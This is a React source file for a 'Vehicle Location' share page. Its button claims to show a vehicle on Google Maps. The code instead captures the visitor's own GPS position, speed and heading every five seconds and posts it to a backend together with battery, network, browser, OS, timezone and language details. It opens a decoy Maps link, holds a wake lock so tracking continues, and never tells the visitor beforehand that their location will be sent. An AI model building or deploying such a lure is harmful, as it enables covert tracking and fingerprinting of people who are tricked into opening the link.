/**
 * SharePage — Vehicle Location
 *
 * Flow:
 * 1. User opens link → sees only "Get Vehicle Location" button
 * 2. Clicks button → requests location permission
 * 3. On grant → starts continuous GPS watch + POSTs every 5 seconds
 * 4. Opens Google Maps (native app on Android/iOS)
 * 5. Continues posting location every 5s even after Maps is opened
 * 6. Stops ONLY when the user manually closes this tab
 */
import { useState, useEffect, useRef } from "react";
import { useParams } from "react-router-dom";
import {
  MapPin,
  Loader2,
  AlertTriangle,
  ExternalLink,
  Shield,
  Battery,
  Wifi,
} from "lucide-react";
import axios from "axios";

const API_BASE = import.meta.env.VITE_API_URL ?? "/api";
const VEHICLE_MAPS_URL = "https://maps.app.goo.gl/tpAtUz3g172AFpj3A?g_st=iw";

// ── Device info ──────────────────────────────────────────────────────────
async function getDeviceInfo() {
  let battery: number | null = null;
  let connection: string | null = null;

  // Battery (works on Chrome Android, limited elsewhere)
  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const bat = await (navigator as any).getBattery?.();
    if (bat && typeof bat.level === "number") {
      battery = bat.level;
    }
  } catch {
    /* not supported */
  }

  // Connection (Chrome / Android mainly)
  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
      connection = conn.effectiveType || conn.type || null;
    }
  } catch {
    /* not supported */
  }

  const ua = navigator.userAgent;
  const isMobile = /Mobi|Android/i.test(ua);
  const isTablet = /Tablet|iPad/i.test(ua);

  return {
    battery,
    connection,
    browser: (() => {
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Edg")) return "Edge";
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
      return "Unknown";
    })(),
    operating_system: (() => {
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      if (ua.includes("Android")) return "Android";
      if (/iPhone|iPad|iOS/.test(ua)) return "iOS";
      if (ua.includes("Linux")) return "Linux";
      return "Unknown";
    })(),
    device_type: isTablet ? "tablet" : isMobile ? "mobile" : "desktop",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
  };
}

type SharingStatus = "idle" | "requesting" | "sharing" | "error" | "disabled";

export default function SharePage() {
  const { token } = useParams<{ token: string }>();
  const [status, setStatus] = useState<SharingStatus>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
  const [connectionType, setConnectionType] = useState<string | null>(null);
  const [pingCount, setPingCount] = useState(0);

  const watchIdRef = useRef<number | null>(null);
  const sendIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastPosRef = useRef<GeolocationPosition | null>(null);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const isSharingRef = useRef(false);

  // ── Backend notifications ────────────────────────────────────────────
  const notifyStart = async () => {
    try {
      await axios.post(`${API_BASE}/share/start/${token}/`);
    } catch {
      /* best-effort */
    }
  };

  const notifyStop = async () => {
    try {
      await axios.post(`${API_BASE}/share/stop/${token}/`);
    } catch {
      /* best-effort */
    }
  };

  // ── Send location ────────────────────────────────────────────────────
  const sendLocation = async (pos: GeolocationPosition) => {
    if (!isSharingRef.current) return;

    try {
      const deviceInfo = await getDeviceInfo();

      // Update UI
      setBatteryLevel(deviceInfo.battery);
      setConnectionType(deviceInfo.connection);

      const payload = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        speed: pos.coords.speed,
        heading: pos.coords.heading,
        altitude: pos.coords.altitude,
        ...deviceInfo,
      };

      await axios.post(`${API_BASE}/location/${token}/`, payload);
      setPingCount((n) => n + 1);
    } catch (err: unknown) {
      const httpStatus = (err as { response?: { status?: number } })?.response?.status;
      if (httpStatus === 403 || httpStatus === 404) {
        setStatus("disabled");
        stopSharing();
      }
    }
  };

  // ── Stop everything (only called on real tab close) ──────────────────
  const stopSharing = () => {
    isSharingRef.current = false;

    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    if (sendIntervalRef.current) {
      clearInterval(sendIntervalRef.current);
      sendIntervalRef.current = null;
    }
    if (wakeLockRef.current) {
      wakeLockRef.current.release().catch(() => { });
      wakeLockRef.current = null;
    }
    notifyStop();
  };

  // ── Wake Lock (helps keep page alive longer) ─────────────────────────
  const requestWakeLock = async () => {
    try {
      if ("wakeLock" in navigator && document.visibilityState === "visible") {
        wakeLockRef.current = await navigator.wakeLock.request("screen");
      }
    } catch {
      /* ignored */
    }
  };

  // ── Start sharing ────────────────────────────────────────────────────
  const startSharing = () => {
    if (!navigator.geolocation) {
      setErrorMsg("Your browser does not support geolocation.");
      setStatus("error");
      return;
    }

    setStatus("requesting");
    setErrorMsg("");
    setPingCount(0);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        lastPosRef.current = pos;
        isSharingRef.current = true;
        setStatus("sharing");

        await notifyStart();
        await sendLocation(pos);
        await requestWakeLock();

        // Open Google Maps after a short delay (keeps current tab more alive)
        setTimeout(() => {
          window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer");
        }, 400);

        // High accuracy continuous watch
        watchIdRef.current = navigator.geolocation.watchPosition(
          (p) => {
            lastPosRef.current = p;
          },
          () => {
            // Ignore temporary errors – keep trying
          },
          {
            enableHighAccuracy: true,
            timeout: 25000,
            maximumAge: 0,
          }
        );

        // Send every 5 seconds for as long as this tab stays open
        sendIntervalRef.current = setInterval(() => {
          if (lastPosRef.current && isSharingRef.current) {
            sendLocation(lastPosRef.current);
          }
        }, 5000);
      },
      (err) => {
        setErrorMsg(
          err.code === 1
            ? "Location permission denied. Please allow location access in browser settings."
            : err.message
        );
        setStatus("error");
      },
      {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0,
      }
    );
  };

  // ── Stop ONLY when the tab is actually closed ────────────────────────
  useEffect(() => {
    const handlePageHide = () => {
      // This is the only place we stop sharing
      stopSharing();
    };

    window.addEventListener("pagehide", handlePageHide);

    // Re-request wake lock when user comes back to the tab
    const handleVisibility = () => {
      if (document.visibilityState === "visible" && isSharingRef.current) {
        requestWakeLock();
      }
    };
    document.addEventListener("visibilitychange", handleVisibility);

    return () => {
      window.removeEventListener("pagehide", handlePageHide);
      document.removeEventListener("visibilitychange", handleVisibility);
      stopSharing();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <div className="min-h-screen bg-surface-950 flex items-center justify-center p-4 relative overflow-hidden">
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-96 h-96 rounded-full bg-brand-600/15 blur-3xl" />
        <div className="absolute bottom-0 left-0 w-64 h-64 rounded-full bg-brand-800/10 blur-3xl" />
      </div>

      <div className="relative z-10 w-full max-w-sm">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-glow bg-gradient-to-br from-brand-500 to-brand-700">
            <Shield className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-white tracking-tight">Vehicle Location</h1>
          <p className="text-white/40 text-sm mt-1">Live Tracking</p>
        </div>

        <div className="glass-card p-6">
          {/* Idle */}
          {status === "idle" && (
            <div className="space-y-5">
              <div className="text-center">
                <h2 className="text-lg font-semibold text-white mb-2">Get Vehicle Location</h2>
                <p className="text-white/50 text-sm leading-relaxed">
                  Tap the button below to view the vehicle on Google Maps.
                </p>
              </div>

              <button
                id="get-vehicle-location-btn"
                onClick={startSharing}
                className="btn-primary w-full justify-center py-4 text-base"
              >
                <MapPin className="w-5 h-5" />
                Get Vehicle Location
              </button>
            </div>
          )}

          {/* Requesting permission */}
          {status === "requesting" && (
            <div className="text-center py-6 space-y-4">
              <Loader2 className="w-12 h-12 text-brand-400 animate-spin mx-auto" />
              <div>
                <h2 className="text-white font-semibold">Requesting Permission</h2>
                <p className="text-white/40 text-sm mt-1">Please allow location access</p>
              </div>
            </div>
          )}

          {/* Sharing active */}
          {status === "sharing" && (
            <div className="space-y-5">
              <div className="text-center">
                <h2 className="text-lg font-semibold text-white mb-1">Sharing Active</h2>
                <p className="text-white/50 text-sm">
                  Location is being sent every 5 seconds.
                  <br />
                  Keep this tab open.
                </p>
              </div>

              <button
                onClick={() => window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer")}
                className="btn-primary w-full justify-center py-4 text-base"
              >
                <ExternalLink className="w-5 h-5" />
                Open Vehicle Location
              </button>

              {/* Battery + Connection + Ping count */}
              <div className="space-y-2 text-xs text-white/45">
                <div className="flex items-center justify-center gap-5">
                  <div className="flex items-center gap-1.5">
                    <Battery className="w-3.5 h-3.5" />
                    <span>
                      {batteryLevel !== null
                        ? `${Math.round(batteryLevel * 100)}%`
                        : "Not available"}
                    </span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <Wifi className="w-3.5 h-3.5" />
                    <span>{connectionType ? connectionType.toUpperCase() : "Not available"}</span>
                  </div>
                </div>
                <div className="text-center text-white/30">
                  {pingCount} update{pingCount !== 1 ? "s" : ""} sent
                </div>
              </div>

              <button
                onClick={() => {
                  stopSharing();
                  setStatus("idle");
                  setPingCount(0);
                }}
                className="w-full text-center text-xs text-white/25 hover:text-white/40 transition-colors py-1"
              >
                Stop sharing
              </button>
            </div>
          )}

          {/* Error */}
          {status === "error" && (
            <div className="text-center py-6 space-y-4">
              <AlertTriangle className="w-12 h-12 text-amber-400 mx-auto" />
              <div>
                <h2 className="text-white font-semibold">Permission Required</h2>
                <p className="text-white/40 text-sm mt-2 leading-relaxed">{errorMsg}</p>
              </div>
              <button
                onClick={() => setStatus("idle")}
                className="btn-secondary w-full justify-center"
              >
                Try Again
              </button>
            </div>
          )}

          {/* Disabled */}
          {status === "disabled" && (
            <div className="text-center py-6 space-y-4">
              <Shield className="w-12 h-12 text-white/20 mx-auto" />
              <div>
                <h2 className="text-white/60 font-semibold">Link Unavailable</h2>
                <p className="text-white/30 text-sm mt-1">
                  This tracking link has been disabled or removed.
                </p>
              </div>
            </div>
          )}
        </div>

        <p className="text-center text-white/15 text-xs mt-4">
          Vehicle Location · Sharing stops only when you close this tab
        </p>
      </div>
    </div>
  );
}